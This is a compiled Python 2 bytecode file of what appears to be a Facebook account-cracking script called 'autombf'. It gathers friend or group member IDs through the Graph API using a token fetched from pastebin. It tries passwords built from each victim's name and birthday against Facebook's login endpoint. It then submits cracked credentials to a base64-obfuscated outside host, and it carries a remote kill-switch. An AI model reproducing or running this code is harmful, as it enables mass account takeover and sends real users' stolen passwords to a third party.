ó
;Ì¶\c           @   s  d  d l  m Z d  d l Z d  d l Z y4 d  d l Z d  d l Z d  d l Z d  d l Z Wni e k
 rÇ d GHe j	 d  e j
 d  e j
 d  d GHe j	 d  e j
 d	  e j
 d
  n Xd GHd Z e j e  Z e j e  Z e j Z d e k re j
 d  e   n  e j d  j Z e d Z e j e  Z e j d e  Z e j e j  Z d e k rd GHe   n  g  Z d GHd GHe e d   Z e d k r)e d  Z e j d e d e  Z  e j e  j  Z! d e! k r
d GHe   n  e d Z" d Z# d Z$ d Z% n e d  k r¨e d!  Z& d" Z$ e j d e& d# e  Z' e j e' j  Z d e k rd$ GHe   n  e& d% Z" d& Z# d' Z% n  d( e$ d) GHe j d e" d* e# d+ e  Z( e j e( j  Z) x# e) d, D] Z* e j+ e* d-  qõWe j	 d   d. e$ d/ e% GHe j	 d  d0 GHe j	 d  d1 GHd2   Z, e d3  Z- e- j. e, e  d4 GHd S(5   iÿÿÿÿ(   t
   ThreadPoolNs   Installing...i   s   pip2 install requestss   pip2 install mechanizes   Install Done!i   t   clears   python2 autombf.pys&   [91mVersion: 0.3
Author: SalisM3[0m
t8   aHR0cDovL2tvbWVuay4wMDB3ZWJob3N0YXBwLmNvbS9zdGF0dXMudHh0t   openThisTools   rm autombf.pys!   https://pastebin.com/raw/6gGzgnavs   ==s+   https://graph.facebook.com/me?access_token=t   errors/   Access Token's Author Expired, Wait Next Updates   1). From Friends Lists   2). From Groups	   pilih>>> i   s	   Your Id: s   https://graph.facebook.com/s   /friends?access_token=s   Id Salahs   /friendst   5000t   Friendst    i   s   Id Group (Public Only) : t   Memberss   /members?access_token=s   Id Salah / Bukan Grup Publiks   /memberst   1000s   Limit = 1000s	   
Getting s    Id.s   ?fields=id&limit=s   &access_token=t   datat   ids   Succes Getting s    Id. s   Cracking....s,   Note: Pastikan Kouta Internet Anda Unlimitedc         C   s  d d d } d d d } | j  d d  } | j  d d  } t j |  } t j |  } | | } yt j d |  d t  } t j | j  }	 |	 d	 d
 }
 t j d |  d |
 d  j	 } d | k rè d |  d |
 GHnd | k rd |  d |
 GHnæ|	 d d
 } t j d |  d | d  } | j	 } d | k r t
 j   } | j |  t | j _ | j d d  |  | d <| | d <| j   nNd | k rÀd |  d | GHn.|	 d } | j  d d  } t j d |  d | d  } | j	 } d | k r$d |  d | GHn d | k rDd |  d | GHna |	 d t k re|	 d	 d } n! |	 d t k r|	 d	 d } n  t j d |  d | d  } | j	 } d | k rÎd |  d | GHn  d | k rîd |  d | GHn  Wn! t k
 rn t k
 rn Xd  S(   Nt   aHR0cHM6Ly9rb21lbmst   aeZAkmis   ==t&   LjAwMHdlYmhvc3RhcHAuY29tL2xpbmsuaHRtbAt
   kMzwAy87aAR   s   https://graph.facebook.com/s   /?access_token=t
   first_namet   123sr   https://b-api.facebook.com:443/method/auth.login?format=json&device_id=fa0agkaj-zgzs-ih1j-rs00-6etvjwmgv9va&email=s
   &password=s§  &cpl=true&family_device_id=fa0agkaj-zgzs-ih1j-rs00-6etvjwmgv9va&sim_serials=%5B%2289014103478080510720%22%5D&credentials_type=password&generate_session_cookies=1&error_detail_type=button_with_disabled&locale=en_US&client_country_code=US&method=auth.login&fb_api_req_friendly_name=authenticate&fb_api_caller_class=com.facebook.account.login.protocol.Fb4aAuthHandler&access_token=6628568379%7Cc1e620fa708a1d5696fb991c1bde5662t   EAs   [92m[OK][0ms    => t   405s   [93m[CP][0mt	   last_namet   nri    R   t   aswt   birthdayt   /t   gendert   gantengt   cantik(   t   replacet   base64t	   b64decodet   requestst   gett   tokent   jsont   loadst   textt   contentt	   mechanizet   Browsert   opent   Truet   _factoryt   is_htmlt   select_formt   submitt   malet   femalet   KeyErrort	   NameError(   t   argt   s1t   s2t   s3t   s4t   s5t   s6t   s7t   ct   dt   pw1t   et   pw2t   ft   gt   brt   pw3t   pw4t   ht   it   pw5t   jt   k(    (    s
   newfile.pyt   mainL   sh    
"	


		i   s   
Done!(/   t   multiprocessing.poolR    t   ost   timeR   R"   R   R&   t   ImportErrort   sleept   systemt   lsR   t   ls2R    t   stR%   t   stct   exitt   tt   t2R!   t   ctR#   R$   t   ct2R   t   intt   inputt   piliht	   raw_inputt   idct   idc2t   idc3t   ggt   batast   modolt   limitt   idnayeuht   idcekt   at   bt   st   appendRI   t   pt   map(    (    (    s
   newfile.pyt   <module>   s   4	




	

	#	<